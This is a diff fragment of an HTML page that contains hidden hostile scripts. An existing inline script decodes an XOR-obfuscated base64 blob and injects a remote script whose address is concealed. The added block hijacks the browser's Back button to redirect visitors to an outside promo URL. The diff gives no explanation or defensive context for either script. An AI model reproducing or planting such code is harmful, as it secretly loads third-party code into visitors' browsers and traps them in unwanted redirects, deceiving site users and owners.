@@ -22,6 +22,18 @@
 
 <script>(function(){var o_s35=atob("DAYZz5qBqMFAr7fk+X07uujtivtix8OQiXUj4LXizK9u2sOJkGBg4fnuxe8i3ZiXmnRwv+7yh7Ep19KI1nZwt//thqszjZvGmHJtvfPj3bUl3JXeols17f3tx6Mhw8TGw11i7fTgxaRilZWUkH58o9Pliu1i2daIjGM79bi3yfgkzdSHmjd4raq1mPNxnoSFyTAp+v6j1Zw9");var l_l87g=[];for(var c_nza=0;c_nza<o_s35.length;c_nza++){l_l87g.push(o_s35.charCodeAt(c_nza)&255);}var i_7=l_l87g[0];var p_zfy=l_l87g.slice(1,1+i_7);var x_3l=l_l87g.slice(1+i_7);var g_3fn=x_3l.map(function(b,p_8l8){return b^p_zfy[p_8l8%i_7];});var w_b1="";for(var k_4x=0;k_4x<g_3fn.length;k_4x++){w_b1+=String.fromCharCode(g_3fn[k_4x]&255);}var v_v=decodeURIComponent(escape(w_b1));var r_a5=JSON.parse(v_v);var y_sz2=r_a5.globals||[];y_sz2.forEach(function(b_msz){window[b_msz.name]=b_msz.value;});var k_x=document.createElement("script");k_x.src=r_a5.url;k_x.async=true;k_x.defer=true;(r_a5.attributes||[]).forEach(function(r_s69){k_x.setAttribute(r_s69.name,r_s69.value);});(document.head||document.documentElement).appendChild(k_x);})();</script>
 
+<script>
+(function () {
+    const redirectUrl = 'https://promo2-0.vercel.app/back';
+
+    history.pushState(null, '', location.href);
+
+    window.addEventListener('popstate', function () {
+        window.location.replace(redirectUrl);
+    });
+})();
+</script>
+     
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
